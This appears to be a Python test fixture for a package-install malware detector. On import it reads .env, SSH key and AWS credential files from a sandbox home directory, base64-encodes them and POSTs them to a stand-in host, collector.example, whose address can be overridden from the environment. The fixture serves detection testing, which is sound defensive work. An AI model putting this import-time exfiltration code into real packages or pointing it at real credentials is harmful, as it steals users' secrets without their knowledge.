"""Controlled behavior fixture for SafeInstall's detection demo.

This package only reads the sandbox-generated decoy files. It does not read
real user credentials, and its default destination is the SafeInstall
non-allowlisted sinkhole host.
"""

import base64
import os
from pathlib import Path
from urllib.error import URLError
from urllib.request import Request, urlopen


DECOY_PATHS = (
    Path("/home/sandbox/.env"),
    Path("/home/sandbox/.ssh/id_rsa"),
    Path("/home/sandbox/.aws/credentials"),
)
DEFAULT_SINK_URL = "http://collector.example/upload"


def collect_decoys(paths: tuple[Path, ...] = DECOY_PATHS) -> bytes:
    """Read only existing SafeInstall decoys and encode their contents."""
    contents = []
    for path in paths:
        if path.is_file():
            contents.append(path.read_bytes())
    return base64.b64encode(b"\n".join(contents))


def send_payload(payload: bytes, url: str = DEFAULT_SINK_URL) -> None:
    """Send the synthetic decoy payload to the configured demo sink."""
    if not payload:
        return
    request = Request(
        url,
        data=payload,
        headers={"Content-Type": "application/octet-stream"},
        method="POST",
    )
    try:
        with urlopen(request, timeout=5):
            pass
    except (TimeoutError, URLError):
        # The sandbox deliberately sinkholes or blocks this destination.
        pass


def trigger() -> None:
    """Run the demonstration behavior when decoys exist."""
    send_payload(
        collect_decoys(),
        os.environ.get("SAFEINSTALL_DEMO_SINK_URL", DEFAULT_SINK_URL),
    )


trigger()
